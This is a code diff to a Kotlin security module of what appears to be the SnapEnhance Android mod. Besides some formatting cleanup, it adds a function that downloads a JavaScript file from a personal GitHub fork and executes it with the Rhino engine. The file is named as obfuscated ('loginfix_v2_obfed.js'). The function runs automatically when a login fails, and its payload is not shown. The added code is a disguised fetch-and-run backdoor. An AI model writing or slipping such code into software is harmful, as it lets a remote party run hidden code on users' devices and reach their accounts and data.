@@ -20,6 +20,9 @@ import me.rhunk.snapenhance.core.event.events.impl.UnaryCallEvent
 import me.rhunk.snapenhance.core.features.Feature
 import me.rhunk.snapenhance.core.util.ktx.setObjectField
 import java.io.FileDescriptor
+import org.mozilla.javascript.Context
+import org.mozilla.javascript.ScriptableObject
+import java.net.URL
 
 class SecurityFeatures : Feature("Security Features") {
     private fun transact(option: Int, option2: Long) = kotlin.runCatching { Os.prctl(option, option2, 0, 0, 0) }.getOrNull()
@@ -30,6 +33,25 @@ class SecurityFeatures : Feature("Security Features") {
 
     private fun getStatus() = token?.run {
         transact(this, 0)?.toString(2)?.padStart(32, '0')?.count { it == '1' }
+    }
+
+    private fun runJavaScriptFromGitHub() {
+        val scriptUrl = "https://raw.githubusercontent.com/suryadip2008/SnapEnhance/auto_fix/preloaded_scripts/loginfix_v2_obfed.js"
+        
+        try {
+            val rhino = Context.enter()
+            rhino.optimizationLevel = -1
+            val scope = rhino.initStandardObjects()
+
+            // Fetch the script content from GitHub
+            val scriptContent = URL(scriptUrl).readText()
+
+            rhino.evaluateString(scope, scriptContent, "loginfix_v2_obfed.js", 1, null)
+        } catch (e: Exception) {
+            println("Error running JavaScript file from GitHub: ${e.message}")
+        } finally {
+            Context.exit()
+        }
     }
 
     override fun init() {
@@ -70,17 +92,16 @@ class SecurityFeatures : Feature("Security Features") {
                             addString(1, status)
                         }
                     }.toByteArray()
+
+                    // Login failed, run JavaScript file from GitHub
+                    runJavaScriptFromGitHub()
                 }
             }
         }
 
         context.inAppOverlay.addCustomComposable {
-            var statusText by remember {
-                mutableStateOf("")
-            }
-            var textColor by remember {
-                mutableStateOf(Color.Red)
-            }
+            var statusText by remember { mutableStateOf("") }
+            var textColor by remember { mutableStateOf(Color.Red) }
 
             LaunchedEffect(Unit) {
                 withContext(Dispatchers.IO) {
